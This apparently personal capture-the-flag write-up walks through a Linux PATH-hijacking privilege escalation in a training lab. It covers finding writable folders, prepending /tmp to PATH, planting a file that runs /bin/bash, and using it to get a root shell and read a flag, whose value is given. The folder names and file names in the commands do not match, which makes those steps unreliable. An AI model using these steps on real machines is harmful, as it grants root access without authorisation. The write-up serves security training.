## Privilege Escalation PATH Solution

### Notes:
- exploiting path folders which we have write access to. 
- see if you have write access to PATH so you can add folders where you have write access to. 
  - binaries run in path are usually run under root privileges. 
  - copy binary in the folder indicated in path then run a binary containing "/bin/bash" to create a root enabled shell. 

### What is the odd folder you have write access for?
1. Run the following command to find write acccess for your user. 

```
find / -writable 2>/dev/null | cut -d "/" -f 2 | sort -u 
```

Running it doesn't provide the answer we need let's go 1 level deeper: 
```
find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
```

![Screenshot 2024-02-09 at 8 08 11 PM](https://github.com/niccololampa/cyber-security-notes/assets/37615906/5fccce0a-4d79-4844-b615-9bb3889e477b)



**Answer: home/murdock**


### What is the content of the flag6.txt file?
1. First run the following to see the path:
```
echo $PATH
```
![Screenshot 2024-02-09 at 9 22 52 PM](https://github.com/niccololampa/cyber-security-notes/assets/37615906/0711b158-15d7-4175-b250-6ff42a25ad1a)

2. Let's see if we have any write permissions in any of the $PATH directories.
```
find / -writable  2>/dev/null | cut -d "/" -f 2,3,4 | grep usr | sort -u
```
![Screenshot 2024-02-09 at 9 45 36 PM](https://github.com/niccololampa/cyber-security-notes/assets/37615906/a296eb75-af03-4ba2-b1c1-4ab7b0fa3fe4)

3. Unfortunately the writable usr/lib/systemd is not included in the path.
4. We will append /tmp in the PATH by running the following command:
```
export PATH=/tmp:$PATH
```
5. Execute the following command:
```
cd /tmp
echo "/bin/bash" > thm
chmod 777 thm
```

6. Execute the following which will grant you a root access bash terminal
```
cd /home/murdoch/
/.test
```

7. Execute `cat /home/matt/flag6.txt`
![Screenshot 2024-02-09 at 11 13 47 PM](https://github.com/niccololampa/cyber-security-notes/assets/37615906/d2949442-0b6c-4613-81cd-e560d6d72012)

**Answer: THM-736628929**
